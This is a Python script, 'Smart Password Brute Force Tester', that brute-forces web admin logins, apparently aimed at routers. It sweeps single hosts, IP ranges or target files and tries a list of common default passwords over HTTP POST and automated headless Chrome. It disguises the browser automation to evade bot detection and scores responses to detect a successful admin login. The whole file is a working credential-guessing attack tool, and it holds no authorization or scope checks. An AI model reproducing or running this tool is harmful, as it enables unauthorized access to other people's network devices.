#!/usr/bin/env python3
"""
Smart Password Brute Force Tester - FIXED VERSION
Intelligent detection with optimal speed and reliability
"""

import asyncio
import aiohttp
import platform
import logging
import sys
import time
import ipaddress
from dataclasses import dataclass
from typing import List, Dict, Tuple, Optional
import argparse
import os
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.alert import Alert
import re

@dataclass
class TestResult:
    target: str
    password: str
    success: bool
    score: int
    response_time: float
    verification_steps: List[str]
    error: Optional[str] = None
    method: str = "http"

class SmartDetectionTester:
    def __init__(self, headless: bool = True):
        self.driver = None
        self.headless = headless
        self.setup_chrome()
    
    def setup_chrome(self):
        """Setup Chrome driver with optimized settings"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument('--headless=new')
            
            # Essential options
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1200,800')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # Performance optimizations
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins-discovery')
            chrome_options.add_argument('--disable-images')
            chrome_options.add_argument('--disable-javascript')  # Disabled for faster loading
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(20)
            self.driver.implicitly_wait(3)
            
            # Execute script to remove webdriver property
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print("✅ Chrome driver initialized successfully")
            
        except WebDriverException as e:
            print(f"❌ Chrome initialization error: {e}")
            self.driver = None
    
    def close_chrome(self):
        """Safely close Chrome driver"""
        if self.driver:
            try:
                self.driver.quit()
                print("🔒 Chrome driver closed")
            except Exception as e:
                print(f"⚠️ Error closing Chrome: {e}")
    
    def handle_alerts_and_popups(self):
        """Enhanced popup and alert handling"""
        try:
            # Handle JavaScript alerts first
            try:
                WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                alert_text = alert.text.lower()
                print(f"🚨 Alert detected: {alert_text[:50]}...")
                alert.accept()
                time.sleep(1)
                return True
            except TimeoutException:
                pass
            
            # Handle modal dialogs and popups
            popup_selectors = [
                "button[onclick*='ok']", "button[onclick*='confirm']",
                "input[type='button'][value*='ok']", "input[type='button'][value*='confirm']",
                ".modal button", ".popup button", ".dialog button",
                "button:contains('OK')", "button:contains('Confirm')", "button:contains('Continue')"
            ]
            
            for selector in popup_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for element in elements:
                        if element.is_displayed() and element.is_enabled():
                            element.click()
                            time.sleep(0.5)
                            return True
                except Exception:
                    continue
                    
        except Exception as e:
            print(f"⚠️ Popup handling error: {e}")
        
        return False
    
    def wait_for_page_load(self, timeout=15):
        """Improved page load waiting with multiple checks"""
        start_time = time.time()
        
        try:
            # Wait for document ready state
            WebDriverWait(self.driver, timeout).until(
                lambda driver: driver.execute_script("return document.readyState") == "complete"
            )
            
            # Additional wait for dynamic content
            time.sleep(2)
            
            # Check if page is still loading
            loading_indicators = [
                "loading", "spinner", "wait", "progress"
            ]
            
            page_source = self.driver.page_source.lower()
            if any(indicator in page_source for indicator in loading_indicators):
                time.sleep(3)  # Wait for loading to complete
            
            return True
            
        except TimeoutException:
            print("⚠️ Page load timeout, continuing...")
            return False
        except Exception as e:
            print(f"⚠️ Page load error: {e}")
            return False

    def find_login_elements(self):
        """Enhanced login element detection with multiple strategies"""
        username_field = None
        password_field = None
        login_button = None
        
        # Username field detection
        username_selectors = [
            "input[name='username']", "input[name='user']", "input[name='login']",
            "input[id='username']", "input[id='user']", "input[id='login']",
            "input[type='text']:first-of-type", "input[placeholder*='user']",
            "input[placeholder*='name']", "input[class*='user']"
        ]
        
        for selector in username_selectors:
            try:
                element = self.driver.find_element(By.CSS_SELECTOR, selector)
                if element.is_displayed() and element.is_enabled():
                    username_field = element
                    break
            except:
                continue
        
        # Password field detection
        password_selectors = [
            "input[type='password']", "input[name='password']", "input[name='pass']",
            "input[name='pwd']", "input[id='password']", "input[id='pass']",
            "input[placeholder*='password']", "input[class*='password']"
        ]
        
        for selector in password_selectors:
            try:
                element = self.driver.find_element(By.CSS_SELECTOR, selector)
                if element.is_displayed() and element.is_enabled():
                    password_field = element
                    break
            except:
                continue
        
        # Login button detection
        button_selectors = [
            "input[type='submit']", "button[type='submit']",
            "input[value*='login']", "input[value*='sign in']", "input[value*='log in']",
            "button:contains('Login')", "button:contains('Sign In')", "button:contains('Log In')",
            ".login-btn", "#login-btn", ".btn-login", "#loginBtn"
        ]
        
        for selector in button_selectors:
            try:
                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                for element in elements:
                    if element.is_displayed() and element.is_enabled():
                        login_button = element
                        break
                if login_button:
                    break
            except:
                continue
        
        # Fallback: find any button with login-related text
        if not login_button:
            try:
                buttons = self.driver.find_elements(By.TAG_NAME, "button")
                for button in buttons:
                    if button.is_displayed() and button.is_enabled():
                        text = button.text.lower()
                        if any(keyword in text for keyword in ['login', 'log in', 'sign in', 'submit', 'enter']):
                            login_button = button
                            break
            except:
                pass
        
        return username_field, password_field, login_button

    def calculate_management_score(self, page_source: str, current_url: str, current_title: str, original_url: str, original_title: str) -> Tuple[int, List[str]]:
        """Enhanced scoring system for management page detection"""
        score = 0
        indicators = []
        
        page_lower = page_source.lower()
        url_lower = current_url.lower()
        title_lower = current_title.lower()
        
        # Strong positive indicators (high confidence)
        strong_indicators = {
            'logout': 15, 'log out': 15, 'sign out': 15,
            'dashboard': 12, 'administration': 12, 'admin panel': 12,
            'management': 10, 'configuration': 10, 'settings': 10,
            'status': 8, 'system info': 8, 'device info': 8
        }
        
        # Medium positive indicators
        medium_indicators = {
            'wireless': 6, 'network': 6, 'wan': 6, 'lan': 6,
            'firewall': 5, 'nat': 5, 'dhcp': 5, 'qos': 5,
            'port forwarding': 5, 'access control': 5,
            'firmware': 4, 'backup': 4, 'restore': 4
        }
        
        # Weak positive indicators
        weak_indicators = {
            'admin': 3, 'router': 3, 'modem': 3,
            'internet': 2, 'connection': 2, 'setup': 2
        }
        
        # Negative indicators (login page elements)
        negative_indicators = {
            'password': -3, 'login': -3, 'sign in': -3,
            'username': -2, 'user name': -2, 'enter password': -4,
            'forgot password': -5, 'remember me': -2
        }
        
        # Check all indicators
        all_indicators = {**strong_indicators, **medium_indicators, **weak_indicators, **negative_indicators}
        
        for indicator, weight in all_indicators.items():
            count = page_lower.count(indicator)
            if count > 0:
                contribution = weight * min(count, 3)  # Cap at 3 occurrences
                score += contribution
                indicators.append(f"{indicator}({weight}×{count}={contribution})")
        
        # URL change bonus
        if current_url != original_url:
            url_bonus = 8
            score += url_bonus
            indicators.append(f"url_changed(+{url_bonus})")
        
        # Title change bonus
        if current_title != original_title:
            title_bonus = 5
            score += title_bonus
            indicators.append(f"title_changed(+{title_bonus})")
        
        # Check for management-specific URL patterns
        management_url_patterns = [
            'admin', 'management', 'config', 'setup', 'dashboard',
            'status', 'system', 'network', 'wireless'
        ]
        
        for pattern in management_url_patterns:
            if pattern in url_lower:
                url_pattern_bonus = 6
                score += url_pattern_bonus
                indicators.append(f"url_pattern_{pattern}(+{url_pattern_bonus})")
                break
        
        return score, indicators

    def is_management_page(self, original_url: str, original_title: str) -> Tuple[bool, str]:
        """Enhanced management page detection with improved logic"""
        try:
            current_url = self.driver.current_url
            current_title = self.driver.title
            page_source = self.driver.page_source
            
            print(f"🔍 Analyzing page...")
            print(f"   Original URL: {original_url}")
            print(f"   Current URL: {current_url}")
            print(f"   Title: {current_title[:50]}...")
            
            # CRITICAL: Check if password field still exists
            try:
                password_fields = self.driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
                visible_password_fields = [pf for pf in password_fields if pf.is_displayed()]
                
                if visible_password_fields:
                    print("❌ Password field still visible - login likely failed")
                    return False, "Password field still present"
            except Exception as e:
                print(f"⚠️ Error checking password fields: {e}")
            
            # Calculate management score
            score, indicators = self.calculate_management_score(
                page_source, current_url, current_title, original_url, original_title
            )
            
            print(f"📊 Management Score: {score}")
            print(f"📊 Top Indicators: {', '.join(indicators[:3])}")
            
            # Decision logic with multiple thresholds
            if score >= 20:
                return True, f"High confidence (score: {score})"
            elif score >= 15 and current_url != original_url:
                return True, f"Good confidence with URL change (score: {score})"
            elif score >= 10 and current_title != original_title:
                return True, f"Moderate confidence with title change (score: {score})"
            elif score >= 8 and any('logout' in indicator or 'dashboard' in indicator for indicator in indicators):
                return True, f"Strong indicators present (score: {score})"
            else:
                return False, f"Insufficient confidence (score: {score})"
            
        except Exception as e:
            print(f"❌ Management page analysis error: {e}")
            return False, f"Analysis error: {e}"

    def test_with_chrome(self, target: str, password: str, username: str = "admin") -> TestResult:
        """Enhanced Chrome-based password testing"""
        if not self.driver:
            return TestResult(
                target=target,
                password=password,
                success=False,
                score=0,
                response_time=0,
                verification_steps=["Chrome driver not available"],
                error="Chrome not available",
                method="chrome"
            )
        
        start_time = time.time()
        verification_steps = []
        
        try:
            print(f"\n🎯 Testing Target: {target}")
            print(f"🔑 Password: {password}")
            print(f"👤 Username: {username}")
            
            # Prepare URL
            if not target.startswith(('http://', 'https://')):
                url = f"http://{target}"
            else:
                url = target
            
            # Load page
            print("📄 Loading page...")
            self.driver.get(url)
            
            # Wait for page load
            self.wait_for_page_load()
            
            # Store original page info
            original_url = self.driver.current_url
            original_title = self.driver.title
            verification_steps.append(f"Loaded: {original_url}")
            
            # Handle any initial popups
            self.handle_alerts_and_popups()
            
            # Find login elements
            username_field, password_field, login_button = self.find_login_elements()
            
            if not password_field:
                return TestResult(
                    target=target,
                    password=password,
                    success=False,
                    score=0,
                    response_time=time.time() - start_time,
                    verification_steps=verification_steps + ["No password field found"],
                    error="No password field found",
                    method="chrome"
                )
            
            print("🔍 Login elements found, attempting login...")
            
            # Fill username if field exists
            if username_field:
                username_field.clear()
                username_field.send_keys(username)
                verification_steps.append(f"Username entered: {username}")
            
            # Fill password
            password_field.clear()
            password_field.send_keys(password)
            verification_steps.append("Password entered")
            
            # Submit form
            if login_button:
                login_button.click()
                verification_steps.append("Login button clicked")
            else:
                password_field.send_keys(Keys.RETURN)
                verification_steps.append("Form submitted with Enter key")
            
            # Wait for response
            print("⏳ Waiting for login response...")
            time.sleep(3)
            
            # Handle post-login popups
            self.handle_alerts_and_popups()
            
            # Wait for navigation
            self.wait_for_page_load(timeout=10)
            
            # Additional wait for dynamic content
            time.sleep(2)
            
            # Analyze result
            is_management, reason = self.is_management_page(original_url, original_title)
            verification_steps.append(f"Management check: {is_management} - {reason}")
            
            response_time = time.time() - start_time
            
            if is_management:
                print(f"🎉 LOGIN SUCCESS!")
                print(f"   Target: {target}")
                print(f"   Password: {password}")
                print(f"   Time: {response_time:.1f}s")
                print(f"   Reason: {reason}")
                
                return TestResult(
                    target=target,
                    password=password,
                    success=True,
                    score=100,
                    response_time=response_time,
                    verification_steps=verification_steps,
                    method="chrome"
                )
            else:
                print(f"❌ Login failed: {reason}")
                return TestResult(
                    target=target,
                    password=password,
                    success=False,
                    score=0,
                    response_time=response_time,
                    verification_steps=verification_steps,
                    error=reason,
                    method="chrome"
                )
            
        except Exception as e:
            response_time = time.time() - start_time
            error_msg = str(e)
            print(f"❌ Test error: {error_msg}")
            verification_steps.append(f"Error: {error_msg}")
            
            return TestResult(
                target=target,
                password=password,
                success=False,
                score=0,
                response_time=response_time,
                verification_steps=verification_steps,
                error=error_msg,
                method="chrome"
            )

class SmartBruteForcer:
    def __init__(self, mode: str = "normal"):
        self.mode = mode
        self.start_time = None
        self.found_passwords = set()
        
        # Enhanced password list with common router/admin passwords
        self.password_list = [
            "admin", "password", "123456", "12345", "1234",
            "user", "guest", "root", "administrator", "admin123",
            "password123", "123456789", "qwerty", "abc123",
            "letmein", "welcome", "monkey", "dragon", "master",
            "JAMES1", "james1", "James1",  # Your specific password
            "", "default", "public", "private", "secret",
            "router", "modem", "wifi", "internet", "network",
            "admin1", "admin12", "admin123", "pass", "pass123"
        ]
        
        print(f"🔐 Loaded {len(self.password_list)} passwords")
        print(f"🎮 Mode: {self.mode}")
        print(f"🚀 ENHANCED SMART MODE ACTIVATED")
    
    async def http_test(self, target: str, password: str, username: str = "admin") -> TestResult:
        """Enhanced HTTP testing with better detection"""
        start_time = time.time()
        
        try:
            if not target.startswith(('http://', 'https://')):
                url = f"http://{target}"
            else:
                url = target
            
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # Try multiple login data formats
                login_variations = [
                    {'username': username, 'password': password},
                    {'user': username, 'pass': password},
                    {'login': username, 'pwd': password},
                    {'password': password},  # Password only
                    {'pass': password},
                    {'pwd': password}
                ]
                
                for login_data in login_variations:
                    try:
                        async with session.post(url, data=login_data, ssl=False, allow_redirects=True) as response:
                            final_url = str(response.url)
                            response_text = await response.text()
                            response_lower = response_text.lower()
                            
                            # Enhanced HTTP detection logic
                            management_indicators = [
                                'logout', 'log out', 'sign out', 'dashboard',
                                'administration', 'management', 'configuration',
                                'status', 'wireless', 'network', 'wan', 'lan',
                                'firewall', 'nat', 'dhcp', 'system info'
                            ]
                            
                            login_indicators = [
                                'password', 'login', 'sign in', 'username',
                                'enter password', 'forgot password'
                            ]
                            
                            management_count = sum(1 for indicator in management_indicators 
                                                 if indicator in response_lower)
                            login_count = sum(1 for indicator in login_indicators 
                                            if indicator in response_lower)
                            
                            url_changed = final_url.lower() != url.lower()
                            
                            # Scoring logic for HTTP
                            http_score = management_count * 3 - login_count * 2
                            if url_changed:
                                http_score += 5
                            
                            # Success criteria
                            success = (
                                (http_score >= 8) or
                                (url_changed and management_count >= 2 and login_count <= 1) or
                                (management_count >= 4 and login_count == 0)
                            )
                            
                            response_time = time.time() - start_time
                            
                            if success:
                                print(f"🎉 HTTP SUCCESS! {target} | {password}")
                                return TestResult(
                                    target=target,
                                    password=password,
                                    success=True,
                                    score=http_score,
                                    response_time=response_time,
                                    verification_steps=[f"HTTP: Management={management_count}, Login={login_count}, URL_changed={url_changed}"],
                                    method="http"
                                )
                    except asyncio.TimeoutError:
                        continue
                    except Exception as e:
                        continue
                
                # If no variation succeeded
                response_time = time.time() - start_time
                return TestResult(
                    target=target,
                    password=password,
                    success=False,
                    score=0,
                    response_time=response_time,
                    verification_steps=["HTTP: All login variations failed"],
                    method="http"
                )
                    
        except Exception as e:
            response_time = time.time() - start_time
            return TestResult(
                target=target,
                password=password,
                success=False,
                score=0,
                response_time=response_time,
                verification_steps=[f"HTTP Error: {str(e)}"],
                error=str(e),
                method="http"
            )
    
    def load_targets(self, target_input: str) -> List[str]:
        """Enhanced target loading with validation"""
        targets = []
        
        try:
            # Single target
            if not any(char in target_input for char in ['./-']) and not os.path.exists(target_input):
                targets.append(target_input)
                print(f"🎯 Single target: {target_input}")
            
            # IP range
            elif '-' in target_input and not os.path.exists(target_input):
                try:
                    start_ip, end_ip = target_input.split('-')
                    start = ipaddress.IPv4Address(start_ip.strip())
                    end = ipaddress.IPv4Address(end_ip.strip())
                    
                    for ip_int in range(int(start), int(end) + 1):
                        targets.append(str(ipaddress.IPv4Address(ip_int)))
                    
                    print(f"📡 IP range: {start_ip} to {end_ip} ({len(targets)} targets)")
                except Exception as e:
                    print(f"❌ Invalid IP range: {target_input} - {e}")
            
            # File input
            elif os.path.exists(target_input):
                with open(target_input, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            targets.append(line)
                
                print(f"📁 File input: {target_input} ({len(targets)} targets)")
            
            else:
                # Try to parse as single IP/hostname
                targets.append(target_input)
                print(f"🎯 Treating as single target: {target_input}")
                
        except Exception as e:
            print(f"❌ Error loading targets: {e}")
        
        return targets
    
    async def brute_force_single_target(self, target: str):
        """Enhanced single target brute force with better logic"""
        print(f"\n🎯 Testing Target: {target}")
        print("-" * 50)
        
        target_results = []
        
        # HTTP testing first (faster)
        if self.mode in ["normal", "both"]:
            print("🔍 Starting HTTP tests...")
            for i, password in enumerate(self.password_list, 1):
                if password in self.found_passwords:
                    continue
                
                print(f"   [{i}/{len(self.password_list)}] Testing: {password}")
                result = await self.http_test(target, password)
                target_results.append(result)
                
                if result.success:
                    print(f"🎉 HTTP SUCCESS! Password: {password}")
                    self.found_passwords.add(password)
                    return target_results
                
                # Small delay to avoid overwhelming the target
                await asyncio.sleep(0.1)
        
        # Chrome testing (more thorough)
        if self.mode in ["chrome", "both"]:
            print("🔍 Starting Chrome tests...")
            chrome_tester = SmartDetectionTester(headless=True)
            
            try:
                for i, password in enumerate(self.password_list, 1):
                    if password in self.found_passwords or any(r.success and r.password == password for r in target_results):
                        continue
                    
                    print(f"   [{i}/{len(self.password_list)}] Chrome testing: {password}")
                    result = chrome_tester.test_with_chrome(target, password)
                    target_results.append(result)
                    
                    if result.success:
                        print(f"🎉 CHROME SUCCESS! Password: {password}")
                        self.found_passwords.add(password)
                        break
                    
                    # Delay between attempts
                    time.sleep(1)
                    
            finally:
                chrome_tester.close_chrome()
        
        return target_results
    
    async def brute_force_targets(self, targets: List[str]):
        """Enhanced multi-target brute force"""
        if not targets:
            print("❌ No valid targets to test")
            return []
        
        self.start_time = time.time()
        all_results = []
        
        print(f"\n🚀 Starting Enhanced Smart Brute Force")
        print(f"🎯 Targets: {len(targets)}")
        print(f"🔑 Passwords: {len(self.password_list)}")
        print(f"🎮 Mode: {self.mode}")
        print("=" * 60)
        
        for i, target in enumerate(targets, 1):
            print(f"\n📋 Target {i}/{len(targets)}: {target}")
            
            target_results = await self.brute_force_single_target(target)
            all_results.extend(target_results)
            
            # Check for success
            successful = [r for r in target_results if r.success]
            if successful:
                print(f"✅ SUCCESS! Password found: {successful[0].password}")
                print(f"   Method: {successful[0].method}")
                print(f"   Time: {successful[0].response_time:.1f}s")
            else:
                print(f"❌ No working password found for {target}")
            
            # Brief pause between targets
            if i < len(targets):
                await asyncio.sleep(0.5)
        
        return all_results
    
    def save_results(self, results: List[TestResult], filename: str = "smart_results.txt"):
        """Enhanced results saving"""
        successful = [r for r in results if r.success]
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("ENHANCED SMART BRUTE FORCE RESULTS\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Execution mode: {self.mode}\n")
            f.write(f"Test time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total execution time: {time.time() - self.start_time:.1f}s\n\n")
            
            if successful:
                f.write(f"🎉 SUCCESSFUL LOGINS ({len(successful)}):\n")
                f.write("-" * 40 + "\n")
                for result in successful:
                    f.write(f"Target: {result.target}\n")
                    f.write(f"Password: {result.password}\n")
                    f.write(f"Method: {result.method}\n")
                    f.write(f"Score: {result.score}\n")
                    f.write(f"Response time: {result.response_time:.2f}s\n")
                    f.write(f"Verification: {'; '.join(result.verification_steps)}\n")
                    f.write("-" * 40 + "\n")
            else:
                f.write("❌ NO SUCCESSFUL LOGINS FOUND\n\n")
            
            # Detailed statistics
            f.write(f"📊 DETAILED STATISTICS:\n")
            f.write(f"Total tests performed: {len(results)}\n")
            f.write(f"Successful logins: {len(successful)}\n")
            f.write(f"Failed attempts: {len(results) - len(successful)}\n")
            
            if len(results) > 0:
                f.write(f"Success rate: {len(successful)/len(results)*100:.1f}%\n")
                avg_time = sum(r.response_time for r in results) / len(results)
                f.write(f"Average response time: {avg_time:.2f}s\n")
            
            # Method breakdown
            http_results = [r for r in results if r.method == "http"]
            chrome_results = [r for r in results if r.method == "chrome"]
            
            if http_results:
                http_success = [r for r in http_results if r.success]
                f.write(f"HTTP tests: {len(http_results)} (success: {len(http_success)})\n")
            
            if chrome_results:
                chrome_success = [r for r in chrome_results if r.success]
                f.write(f"Chrome tests: {len(chrome_results)} (success: {len(chrome_success)})\n")
        
        print(f"💾 Results saved to: {filename}")
    
    def print_summary(self, results: List[TestResult]):
        """Enhanced summary display"""
        successful = [r for r in results if r.success]
        total_time = time.time() - self.start_time
        
        print("\n" + "=" * 60)
        print("🎯 ENHANCED SMART TESTING COMPLETE")
        print("=" * 60)
        
        if successful:
            print(f"🎉 SUCCESSFUL LOGINS FOUND: {len(successful)}\n")
            for result in successful:
                print(f"🎯 Target: {result.target}")
                print(f"🔑 Password: {result.password}")
                print(f"🔧 Method: {result.method}")
                print(f"📊 Score: {result.score}")
                print(f"⏱️  Time: {result.response_time:.1f}s")
                print("-" * 40)
        else:
            print("❌ No successful logins found")
            print("💡 Suggestions:")
            print("   - Try different username combinations")
            print("   - Check if target is accessible")
            print("   - Verify target has a web interface")
            print("   - Consider expanding password list")
        
        print(f"\n📊 FINAL STATISTICS:")
        print(f"Total tests: {len(results)}")
        print(f"Successful: {len(successful)}")
        print(f"Failed: {len(results) - len(successful)}")
        
        if len(results) > 0:
            print(f"Success rate: {len(successful)/len(results)*100:.1f}%")
            avg_time = sum(r.response_time for r in results) / len(results)
            print(f"Average time per test: {avg_time:.2f}s")
        
        print(f"Total execution time: {total_time:.1f}s")
        print(f"Mode used: {self.mode}")

def main():
    print("🚀 ENHANCED SMART BRUTE FORCER")
    print("=" * 50)
    print("Fixed version with improved detection logic")
    print("=" * 50)
    
    parser = argparse.ArgumentParser(description='Enhanced Smart Password Brute Force Tester')
    parser.add_argument('--target', '-t', required=True, 
                       help='Target: IP address, IP range (192.168.1.1-192.168.1.10), or file path')
    parser.add_argument('--mode', '-m', choices=['normal', 'chrome', 'both'], 
                       default='both', help='Testing mode (default: both)')
    parser.add_argument('--verbose', '-v', action='store_true', 
                       help='Enable verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    
    print(f"🎯 Target: {args.target}")
    print(f"🎮 Mode: {args.mode}")
    print(f"📝 Verbose: {args.verbose}")
    print()
    
    brute_forcer = SmartBruteForcer(mode=args.mode)
    
    targets = brute_forcer.load_targets(args.target)
    
    if not targets:
        print("❌ No valid targets found")
        return
    
    try:
        results = asyncio.run(brute_forcer.brute_force_targets(targets))
        
        if results:
            brute_forcer.save_results(results)
            brute_forcer.print_summary(results)
        else:
            print("❌ No tests completed")
    except KeyboardInterrupt:
        print("\n⚠️ Testing interrupted by user")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")

if __name__ == "__main__":
    main()